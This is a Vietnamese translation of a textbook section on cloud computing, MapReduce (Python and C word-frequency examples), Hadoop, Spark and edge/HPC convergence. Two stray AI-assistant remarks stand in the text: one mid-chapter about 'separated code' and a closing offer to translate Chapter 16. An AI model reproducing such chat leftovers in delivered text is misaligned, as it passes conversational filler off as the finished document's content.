<p>Hầu hết các nhà cung cấp PaaS cho phép lập trình viên viết ứng dụng bằng nhiều ngôn ngữ khác nhau và cung cấp nhiều API để sử dụng.<br />
Ví dụ: dịch vụ của <strong>Microsoft Azure</strong> cho phép người dùng lập trình ứng dụng web trong <strong>Visual Studio IDE</strong> và triển khai ứng dụng lên Azure để kiểm thử.<br />
<strong>Google App Engine</strong> cho phép lập trình viên xây dựng và kiểm thử ứng dụng di động tùy chỉnh trên cloud bằng nhiều ngôn ngữ.<br />
<strong>Heroku</strong> và <strong>CloudBees</strong> là những ví dụ nổi bật khác.</p>
<p>Lưu ý rằng lập trình viên chỉ kiểm soát ứng dụng và dữ liệu của mình; nhà cung cấp cloud kiểm soát phần còn lại của hạ tầng phần mềm và toàn bộ hạ tầng phần cứng bên dưới.</p>
<h3 id="1532-mapreduce"><a class="header" href="#1532-mapreduce">15.3.2. MapReduce</a></h3>
<p>Có lẽ mô hình lập trình nổi tiếng nhất được sử dụng trên các hệ thống cloud là <strong>MapReduce</strong>^3^.<br />
Mặc dù nguồn gốc của MapReduce bắt nguồn từ các phép toán <strong>Map</strong> và <strong>Reduce</strong> trong lập trình hàm (functional programming), <strong>Google</strong> là công ty đầu tiên áp dụng khái niệm này để phân tích khối lượng lớn dữ liệu web.</p>
<p>MapReduce đã giúp Google thực hiện các truy vấn web nhanh hơn đối thủ, và góp phần đưa Google trở thành nhà cung cấp dịch vụ web và “gã khổng lồ” internet như ngày nay.</p>
<h4 id="hiểu-về-các-phép-toán-map-và-reduce"><a class="header" href="#hiểu-về-các-phép-toán-map-và-reduce">Hiểu về các phép toán Map và Reduce</a></h4>
<p>Các hàm <code>map</code> và <code>reduce</code> trong mô hình MapReduce dựa trên các phép toán <strong>Map</strong> và <strong>Reduce</strong> trong lập trình hàm.<br />
Trong phần này, chúng ta sẽ thảo luận ngắn gọn cách các phép toán này hoạt động, bằng cách xem lại một số ví dụ đã được trình bày trước đó trong sách.</p>
<p>Phép toán <strong>Map</strong> thường áp dụng cùng một hàm cho tất cả các phần tử trong một tập hợp.<br />
Những độc giả quen thuộc với Python có thể nhận ra chức năng này rõ nhất qua tính năng <strong>list comprehension</strong> (hiểu danh sách) trong Python.</p>
<p>Ví dụ, hai đoạn code dưới đây trong <a href="C15-Parallel/cloud.html#ScalarMap">Bảng 1</a> thực hiện phép nhân vô hướng trong Python:</p>
<p>Chắc chắn rồi. Dưới đây là hai đoạn code đã được tách riêng.</p>
<h4 id="cách-nhân-vô-hướng-thông-thường"><a class="header" href="#cách-nhân-vô-hướng-thông-thường"><strong>Cách nhân vô hướng thông thường</strong></a></h4>
<pre><code class="language-python"># array là mảng số
# s là số nguyên
def scalarMultiply(array, s):
    for i in range(len(array)):
        array[i] = array[i] * s
    return array

# Gọi hàm
myArray = [1, 3, 5, 7, 9]
result = scalarMultiply(myArray, 2)
# In kết quả
print(result)
# [2, 6, 10, 14, 18]
</code></pre>
<h4 id="cách-nhân-vô-hướng-với-list-comprehension"><a class="header" href="#cách-nhân-vô-hướng-với-list-comprehension"><strong>Cách nhân vô hướng với list comprehension</strong></a></h4>
<pre><code class="language-python"># nhân hai số với nhau
def multiply(num1, num2):
    return num1 * num2

# array là mảng số
# s là số nguyên
def scalarMultiply(array, s):
    # dùng list comprehension
    return [multiply(x, s) for x in array]

# Gọi hàm
myArray = [1, 3, 5, 7, 9]
result = scalarMultiply(myArray, 2)
# In kết quả
print(result)
# [2, 6, 10, 14, 18]
</code></pre>
<p>Cú pháp <strong>list comprehension</strong> áp dụng cùng một hàm (trong trường hợp này là nhân một phần tử của mảng với giá trị vô hướng <code>s</code>) cho mọi phần tử <code>x</code> trong <code>array</code>.</p>
<p>Một phép toán <strong>Reduce</strong> đơn lẻ sẽ lấy một tập hợp các phần tử và kết hợp chúng lại thành một giá trị duy nhất bằng một hàm chung nào đó.<br />
Ví dụ: hàm <code>sum</code> trong Python hoạt động tương tự như một phép Reduce, vì nó nhận vào một tập hợp (thường là một danh sách Python) và cộng tất cả các phần tử lại với nhau.<br />
Chẳng hạn, áp dụng phép cộng cho tất cả các phần tử trong mảng <code>result</code> được trả về từ hàm <code>scalarMultiply</code> trong <strong>Bảng 1</strong> sẽ cho ra tổng cộng là <strong>50</strong>.</p>
<h4 id="mô-hình-lập-trình-mapreduce-the-mapreduce-programming-model"><a class="header" href="#mô-hình-lập-trình-mapreduce-the-mapreduce-programming-model">Mô hình lập trình MapReduce (The MapReduce Programming Model)</a></h4>
<p>Một đặc điểm quan trọng của MapReduce là <strong>mô hình lập trình đơn giản</strong>.<br />
Lập trình viên chỉ cần hiện thực hai loại hàm: <code>map</code> và <code>reduce</code>; phần còn lại sẽ được <strong>framework MapReduce</strong> tự động xử lý.</p>
<p>Hàm <code>map</code> do lập trình viên viết sẽ nhận vào một cặp (<em>key</em>, <em>value</em>) và xuất ra một loạt các cặp (<em>key</em>, <em>value</em>) trung gian, được ghi vào <strong>distributed filesystem</strong> (hệ thống tệp phân tán) dùng chung cho tất cả các node.<br />
Một <strong>combiner</strong> (thường được định nghĩa bởi framework MapReduce) sẽ gom nhóm các cặp (<em>key</em>, <em>value</em>) theo key, để tạo thành các cặp (<em>key</em>, list(<em>value</em>)) và chuyển chúng tới hàm <code>reduce</code> do lập trình viên định nghĩa.</p>
<p>Hàm <code>reduce</code> sẽ nhận vào một cặp (<em>key</em>, list(<em>value</em>)) và kết hợp tất cả các giá trị lại thông qua một phép toán do lập trình viên định nghĩa, để tạo ra cặp (<em>key</em>, <em>value</em>) cuối cùng, trong đó <em>value</em> là kết quả của phép giảm (reduction).<br />
Kết quả từ hàm <code>reduce</code> sẽ được ghi vào distributed filesystem và thường được trả về cho người dùng.</p>
<p>Để minh họa cách sử dụng mô hình MapReduce nhằm song song hóa một chương trình, chúng ta xét ví dụ <strong>Word Frequency</strong>.<br />
Mục tiêu của Word Frequency là xác định tần suất xuất hiện của mỗi từ trong một tập văn bản lớn.</p>
<p>Một lập trình viên C có thể hiện thực hàm <code>map</code> cho chương trình Word Frequency như sau:^3^</p>
<pre><code class="language-c">void map(char *key, char *value) {
    // key is document name
    // value is string containing some words (separated by spaces)
    int i;
    int numWords = 0; // number of words found: populated by parseWords()

    // returns an array of numWords words
    char *words[] = parseWords(value, &amp;numWords);
    for (i = 0; i &lt; numWords; i++) {
        // output (word, 1) key-value intermediate to file system
        emit(words[i], &quot;1&quot;);
    }
}
</code></pre>
<p>Hàm <code>map</code> này nhận vào một chuỗi (<code>key</code>) tương ứng với tên tệp, và một chuỗi khác (<code>value</code>) chứa một phần dữ liệu của tệp.<br />
Hàm sẽ tách các từ từ chuỗi <code>value</code> và phát ra (emit) từng từ (<code>words[i]</code>) kèm theo giá trị chuỗi <code>&quot;1&quot;</code>.<br />
Hàm <code>emit</code> được cung cấp bởi framework MapReduce và ghi các cặp (<em>key</em>, <em>value</em>) trung gian vào distributed filesystem.</p>
<p>Để hoàn thiện chương trình Word Frequency, lập trình viên có thể hiện thực hàm <code>reduce</code> như sau:</p>
<pre><code class="language-c">void reduce(char *key, struct Iterator values) {
    // key is individual word
    // value is of type Iterator (a struct that consists of
    // a items array (type char **), and its associated length (type int))
    int numWords = values.length();  // get length
    char *counts[] = values.items(); // get counts
    int i, total = 0;
    for (i = 0; i &lt; numWords; i++) {
        total += atoi(counts[i]); // sum up all counts
    }
    char *stringTotal = itoa(total); // convert total to a string
    emit(key, stringTotal); // output (word, total) pair to file system
}
</code></pre>
<p>Hàm <code>reduce</code> này nhận vào một chuỗi (<code>key</code>) tương ứng với một từ cụ thể, và một struct <code>Iterator</code> (cũng được cung cấp bởi framework MapReduce) bao gồm một mảng các phần tử đã được gom nhóm theo key (<code>items</code>) và độ dài của mảng đó (<code>length</code>).<br />
Trong ứng dụng Word Frequency, <code>items</code> là danh sách các số đếm.</p>
<p>Hàm sẽ lấy số lượng phần tử từ trường <code>length</code> của struct <code>Iterator</code>, và mảng số đếm từ trường <code>items</code>.<br />
Sau đó, nó lặp qua tất cả các số đếm, cộng dồn giá trị vào biến <code>total</code>.<br />
Vì hàm <code>emit</code> yêu cầu tham số kiểu <code>char *</code>, hàm sẽ chuyển đổi <code>total</code> sang chuỗi trước khi gọi <code>emit</code>.</p>
<p>Sau khi hiện thực <code>map</code> và <code>reduce</code>, trách nhiệm của lập trình viên kết thúc.<br />
Framework MapReduce sẽ tự động xử lý phần còn lại, bao gồm:</p>
<ul>
<li>Chia nhỏ dữ liệu đầu vào (partitioning the input)</li>
<li>Tạo và quản lý các tiến trình chạy hàm <code>map</code> (<strong>map tasks</strong>)</li>
<li>Gom nhóm và sắp xếp các cặp (<em>key</em>, <em>value</em>) trung gian</li>
<li>Tạo và quản lý các tiến trình chạy hàm <code>reduce</code> (<strong>reduce tasks</strong>)</li>
<li>Sinh ra tệp kết quả cuối cùng</li>
</ul>
<p>Để đơn giản, <strong>Hình 2</strong> minh họa cách MapReduce song song hóa các câu mở đầu của bài hát nổi tiếng <em>Code Monkey</em> của Jonathan Coulton:<br />
<em>code monkey get up get coffee, code monkey go to job</em>.</p>
<p><img src="C15-Parallel/_images/mapreduceEx.png" alt="Parallelization of the opening lines of the song Code Monkey using the MapReduce framework" /></p>
<p><strong>Hình 2.</strong> Song song hóa các câu mở đầu của bài hát <em>&quot;Code Monkey&quot;</em> bằng <strong>MapReduce framework</strong></p>
<p>Hình 2 cung cấp cái nhìn tổng quan về quá trình này.<br />
Trước khi thực thi, <strong>boss node</strong> (nút điều phối) sẽ chia dữ liệu đầu vào thành <em>M</em> phần, trong đó <em>M</em> tương ứng với số lượng <strong>map task</strong>.<br />
Trong <a href="C15-Parallel/cloud.html#MapReduceFig">Hình 2</a>, <em>M</em> = 3, và tệp đầu vào (<code>coulton.txt</code>) được chia thành ba phần.</p>
<p>Trong <strong>map phase</strong> (giai đoạn map), boss node phân phối các map task cho một hoặc nhiều <strong>worker node</strong>, với mỗi map task được thực thi độc lập và song song.<br />
Ví dụ: map task đầu tiên phân tích đoạn <em>code monkey get up</em> thành các từ riêng biệt và phát ra (emit) bốn cặp (<em>key</em>, <em>value</em>):<br />
(<code>code</code>, <code>1</code>), (<code>monkey</code>, <code>1</code>), (<code>get</code>, <code>1</code>), (<code>up</code>, <code>1</code>).<br />
Mỗi map task sau đó ghi các giá trị trung gian này vào <strong>distributed filesystem</strong> (hệ thống tệp phân tán), chiếm một phần dung lượng lưu trữ trên mỗi node.</p>
<p>Trước khi bắt đầu <strong>reduce phase</strong> (giai đoạn reduce), framework sẽ gom nhóm và kết hợp các cặp (<em>key</em>, <em>value</em>) trung gian thành các cặp (<em>key</em>, list(<em>value</em>)).<br />
Trong Hình 2, ví dụ cặp (<code>get</code>, <code>1</code>) được phát ra bởi hai map task khác nhau.<br />
Framework MapReduce sẽ gom các cặp này thành một cặp duy nhất: (<code>get</code>, <code>[1,1]</code>).<br />
Các cặp trung gian đã được gom nhóm này sẽ được ghi xuống distributed filesystem trên đĩa.</p>
<p>Tiếp theo, framework MapReduce yêu cầu boss node tạo ra <em>R</em> <strong>reduce task</strong>.<br />
Trong Hình 2, <em>R</em> = 8.<br />
Framework sau đó phân phối các reduce task này cho các worker node.<br />
Một lần nữa, mỗi reduce task được thực thi độc lập và song song.</p>
<p>Trong giai đoạn reduce của ví dụ này, cặp (<code>get</code>, <code>[1,1]</code>) được giảm (reduce) thành cặp (<code>get</code>, <code>2</code>).<br />
Mỗi worker node sẽ nối kết quả của các reduce task mà nó xử lý vào tệp kết quả cuối cùng, tệp này sẽ sẵn sàng cho người dùng khi quá trình hoàn tất.</p>
<h4 id="fault-tolerance-khả-năng-chịu-lỗi"><a class="header" href="#fault-tolerance-khả-năng-chịu-lỗi">Fault Tolerance (Khả năng chịu lỗi)</a></h4>
<p>Các <strong>data center</strong> (trung tâm dữ liệu) thường chứa hàng nghìn node.<br />
Do đó, tỷ lệ hỏng hóc phần cứng là cao; ví dụ, nếu một node trong data center có 2% khả năng hỏng phần cứng, thì xác suất có ít nhất một node bị hỏng trong một data center 1.000 node là hơn 99,99%.</p>
<p>Phần mềm viết cho data center vì vậy phải <strong>fault tolerant</strong> (chịu lỗi), nghĩa là có thể tiếp tục hoạt động khi xảy ra sự cố phần cứng (hoặc ít nhất là dừng một cách an toàn).</p>
<p>MapReduce được thiết kế với khả năng chịu lỗi ngay từ đầu.<br />
Trong bất kỳ lần chạy MapReduce nào, sẽ có một boss node và có thể có hàng nghìn worker node.<br />
Khả năng một worker node bị hỏng là cao.</p>
<p>Để xử lý, boss node sẽ <strong>ping</strong> từng worker node theo chu kỳ.<br />
Nếu boss node không nhận được phản hồi từ một worker node, nó sẽ phân phối lại khối lượng công việc của worker đó sang một node khác và thực thi lại task^3^.</p>
<p>Nếu boss node bị hỏng (xác suất thấp vì chỉ có một node), job MapReduce sẽ bị hủy và phải chạy lại trên một node khác.<br />
Lưu ý rằng đôi khi worker node không phản hồi ping của boss node không phải vì hỏng, mà vì bị quá tải.<br />
MapReduce cũng áp dụng cùng chiến lược ping và phân phối lại công việc để giảm tác động của các worker node chậm (<strong>straggler node</strong>).</p>
<h4 id="hadoop-và-apache-spark"><a class="header" href="#hadoop-và-apache-spark">Hadoop và Apache Spark</a></h4>
<p>Sự ra đời của MapReduce đã tạo nên một làn sóng lớn trong giới công nghệ.<br />
Tuy nhiên, bản triển khai MapReduce của Google là <strong>closed source</strong> (mã nguồn đóng).<br />
Do đó, các kỹ sư tại Yahoo! đã phát triển <a href="https://hadoop.apache.org/"><strong>Hadoop</strong></a>, một bản triển khai <strong>open source</strong> (mã nguồn mở) của MapReduce, sau đó được <strong>Apache Foundation</strong> tiếp nhận.</p>
<p>Dự án Hadoop bao gồm một hệ sinh thái các công cụ cho Apache Hadoop, trong đó có <strong>Hadoop Distributed File System (HDFS)</strong> — một giải pháp mã nguồn mở thay thế <strong>Google File System</strong>, và <strong>HBase</strong> — được mô phỏng theo <strong>Google BigTable</strong>.</p>
<p>Hadoop có một số hạn chế chính:</p>
<ul>
<li>Thứ nhất, khó kết nối nhiều job MapReduce thành một <strong>workflow</strong> (quy trình) lớn hơn.</li>
<li>Thứ hai, việc ghi dữ liệu trung gian xuống HDFS trở thành nút thắt cổ chai, đặc biệt với các job nhỏ (dưới 1 GB).</li>
</ul>
<p><a href="https://spark.apache.org/"><strong>Apache Spark</strong></a> được thiết kế để giải quyết các vấn đề này và nhiều vấn đề khác.<br />
Nhờ các tối ưu hóa và khả năng xử lý phần lớn dữ liệu trung gian <strong>trong bộ nhớ</strong> (in-memory), Apache Spark có thể nhanh hơn Hadoop tới <strong>100 lần</strong> trên một số ứng dụng^4^.</p>
<h3 id="1533-hướng-tới-tương-lai-cơ-hội-và-thách-thức"><a class="header" href="#1533-hướng-tới-tương-lai-cơ-hội-và-thách-thức">15.3.3. Hướng tới tương lai: Cơ hội và Thách thức</a></h3>
<p>(<em>Looking Toward the Future: Opportunities and Challenges</em>)</p>
<p>Bất chấp những đổi mới trong cộng đồng phân tích dữ liệu internet, lượng dữ liệu mà nhân loại tạo ra vẫn tiếp tục tăng.<br />
Phần lớn dữ liệu mới được tạo ra trong cái gọi là <strong>edge environment</strong> (môi trường biên), tức là gần các cảm biến và các thiết bị tạo dữ liệu khác — vốn theo định nghĩa nằm ở phía “đầu kia” của mạng so với các nhà cung cấp <strong>commercial cloud</strong> (đám mây thương mại) và hệ thống <strong>HPC</strong> (high-performance computing – tính toán hiệu năng cao).</p>
<p>Truyền thống trước đây, các nhà khoa học và kỹ sư sẽ thu thập dữ liệu và phân tích nó bằng <strong>local cluster</strong> (cụm máy cục bộ), hoặc chuyển dữ liệu tới siêu máy tính hoặc trung tâm dữ liệu để phân tích.<br />
Cách tiếp cận “tập trung” này không còn khả thi nữa khi công nghệ cảm biến ngày càng phát triển, làm trầm trọng thêm “làn sóng dữ liệu” (<em>data deluge</em>).</p>
<p>Một nguyên nhân của sự tăng trưởng bùng nổ này là sự phổ biến của các thiết bị nhỏ có kết nối internet và chứa nhiều loại cảm biến.<br />
Những <strong>Internet of Things</strong> (IoT – Internet vạn vật) này đã tạo ra các tập dữ liệu lớn và đa dạng trong môi trường biên.<br />
Việc truyền các tập dữ liệu lớn từ edge lên cloud là khó khăn, vì dữ liệu càng lớn thì càng tốn nhiều thời gian và năng lượng để di chuyển.</p>
<p>Để giảm bớt các vấn đề hậu cần của cái gọi là <strong>Big Data</strong>, cộng đồng nghiên cứu đã bắt đầu tạo ra các kỹ thuật <strong>tóm tắt dữ liệu mạnh mẽ</strong> tại mỗi điểm truyền giữa edge và cloud^2^.<br />
Có sự quan tâm mạnh mẽ trong cộng đồng nghiên cứu máy tính về việc xây dựng hạ tầng có khả năng xử lý, lưu trữ và tóm tắt dữ liệu ngay tại môi trường biên trên một nền tảng thống nhất; lĩnh vực này được gọi là <strong>edge computing</strong> hoặc <strong>fog computing</strong>.</p>
<p>Edge computing đảo ngược mô hình phân tích Big Data truyền thống: thay vì phân tích diễn ra tại siêu máy tính hoặc trung tâm dữ liệu (“last mile”), thì phân tích diễn ra ngay tại nguồn tạo dữ liệu (“first mile”)^2^.</p>
<p>Ngoài vấn đề hậu cần di chuyển dữ liệu, một mối quan tâm xuyên suốt khác trong phân tích Big Data là <strong>quản lý năng lượng</strong>.<br />
Các tài nguyên tập trung lớn như siêu máy tính và trung tâm dữ liệu tiêu thụ rất nhiều năng lượng; các siêu máy tính hiện đại cần tới hàng megawatt (triệu watt) để vận hành và làm mát.</p>
<p>Một câu nói quen thuộc trong cộng đồng siêu máy tính là “<strong>a megawatt costs a megabuck</strong>” — nghĩa là cần khoảng 1 triệu USD mỗi năm để duy trì nhu cầu điện năng của 1 megawatt^5^.</p>
<p>Việc xử lý dữ liệu cục bộ trong môi trường biên giúp giảm bớt vấn đề di chuyển các tập dữ liệu lớn, nhưng hạ tầng tính toán tại đây cũng phải tiêu thụ năng lượng ở mức tối thiểu^2^.<br />
Đồng thời, việc tăng hiệu suất năng lượng của các siêu máy tính và trung tâm dữ liệu lớn là điều tối quan trọng^5^.</p>
<p>Ngoài ra, còn có sự quan tâm tới việc tìm cách <strong>hội tụ</strong> hai hệ sinh thái HPC và cloud computing để tạo ra một bộ framework, hạ tầng và công cụ chung cho phân tích dữ liệu quy mô lớn.<br />
Những năm gần đây, nhiều nhà khoa học đã sử dụng các kỹ thuật và công cụ do cộng đồng cloud computing phát triển để phân tích các tập dữ liệu HPC truyền thống, và ngược lại.</p>
<p>Việc hội tụ hai hệ sinh thái phần mềm này sẽ cho phép <strong>trao đổi chéo</strong> (cross-pollination) trong nghiên cứu và dẫn tới sự phát triển của một hệ thống thống nhất, cho phép cả hai cộng đồng cùng đối phó với làn sóng dữ liệu sắp tới, và thậm chí có thể chia sẻ tài nguyên.</p>
<p>Nhóm <a href="https://www.exascale.org/bdec/"><strong>Big Data Exascale Computing (BDEC)</strong></a> cho rằng thay vì coi HPC và cloud computing là hai mô hình hoàn toàn khác biệt, sẽ hữu ích hơn nếu xem cloud computing như một giai đoạn “<strong>digitally empowered</strong>” (được số hóa mạnh mẽ) của tính toán khoa học, trong đó nguồn dữ liệu ngày càng được tạo ra qua internet^2^.</p>
<p>Ngoài ra, cần có sự hội tụ về <strong>văn hóa, đào tạo và công cụ</strong> để tích hợp hoàn toàn cộng đồng phần mềm và nghiên cứu HPC với cloud computing.<br />
BDEC cũng đề xuất một mô hình trong đó các siêu máy tính và trung tâm dữ liệu là các “node” trong một mạng lưới tài nguyên tính toán rất lớn, cùng phối hợp để xử lý dữ liệu tràn về từ nhiều nguồn^2^.<br />
Mỗi node sẽ tóm tắt dữ liệu chảy vào nó một cách mạnh mẽ, chỉ chuyển tiếp lên node tài nguyên tính toán lớn hơn khi cần thiết.</p>
<p>Khi các hệ sinh thái cloud computing và HPC tìm kiếm sự thống nhất và chuẩn bị đối phó với làn sóng dữ liệu ngày càng tăng, tương lai của hệ thống máy tính hứa hẹn nhiều khả năng thú vị.<br />
Các lĩnh vực mới như <strong>trí tuệ nhân tạo</strong> (AI) và <strong>tính toán lượng tử</strong> đang dẫn tới sự ra đời của các <strong>domain-specific architecture</strong> (DSA – kiến trúc chuyên biệt theo lĩnh vực) và <strong>application-specific integrated circuit</strong> (ASIC – mạch tích hợp chuyên dụng) mới, có khả năng xử lý các quy trình công việc tùy chỉnh hiệu quả năng lượng hơn trước (xem ví dụ về <strong>TPU</strong>^6^).</p>
<p>Bên cạnh đó, vấn đề <strong>bảo mật</strong> của các kiến trúc này — vốn lâu nay bị cộng đồng bỏ qua — sẽ trở nên quan trọng khi dữ liệu mà chúng phân tích ngày càng có giá trị.<br />
Các kiến trúc mới cũng sẽ dẫn tới sự xuất hiện của các ngôn ngữ lập trình mới để lập trình cho chúng, và có thể cả các hệ điều hành mới để quản lý các giao diện khác nhau.</p>
<p>Để tìm hiểu thêm về tương lai của kiến trúc máy tính, chúng tôi khuyến khích bạn đọc bài viết <a href="https://cacm.acm.org/magazines/2019/2/234352-a-new-golden-age-for-computer-architecture/fulltext">này</a> của hai huyền thoại kiến trúc máy tính, đồng thời là chủ nhân Giải thưởng Turing ACM 2017 — <strong>John Hennessy</strong> và <strong>David Patterson</strong>^7^.</p>
<h3 id="tài-liệu-tham-khảo-9"><a class="header" href="#tài-liệu-tham-khảo-9">Tài liệu tham khảo</a></h3>
<ol>
<li>Armbrust et. al. <em>A view of cloud computing</em>. CACM 53(4). 2010.</li>
<li>Asch et. al. <em>Big data and extreme-scale computing: Pathways to Convergence – Toward a shaping strategy for a future software and data ecosystem for scientific inquiry</em>. The International Journal of High Performance Computing Applications 32(4), 435–479. 2018.</li>
<li>Dean and Ghemawat. <em>MapReduce: Simplified Data Processing on Large Clusters</em>. USENIX. 2004.</li>
<li>DataBricks. <em>Apache Spark</em>. <a href="https://databricks.com/spark/about">https://databricks.com/spark/about</a></li>
<li>M. Halper. <em>Supercomputing's Super Energy Needs, and What to Do About Them</em>. CACM News: <a href="https://cacm.acm.org/news/192296-supercomputings-super-energy-needs-and-what-to-do-about-them/fulltext">https://cacm.acm.org/news/192296-supercomputings-super-energy-needs-and-what-to-do-about-them/fulltext</a></li>
<li>Jouppi et. al. <em>In-datacenter performance analysis of a tensor processing unit</em>. 2017 ACM/IEEE 44th Annual International Symposium on Computer Architecture (ISCA), pp. 1–12. 2017.</li>
<li>J. Hennessy and D. Patterson. <em>A New Golden Age for Computer Architecture</em>. CACM 62(2), 48–60. 2019.</li>
<li>D. A. Reed and J. Dongarra. <em>Exascale computing and big data</em>. CACM 58(7), 56–68. 2015.</li>
</ol>
<p>Bạn có muốn tôi tiếp tục dịch sang <strong>Chương 16 – Operating Systems</strong> để nối tiếp nội dung cuốn sách không?</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>
    </body>
</html>
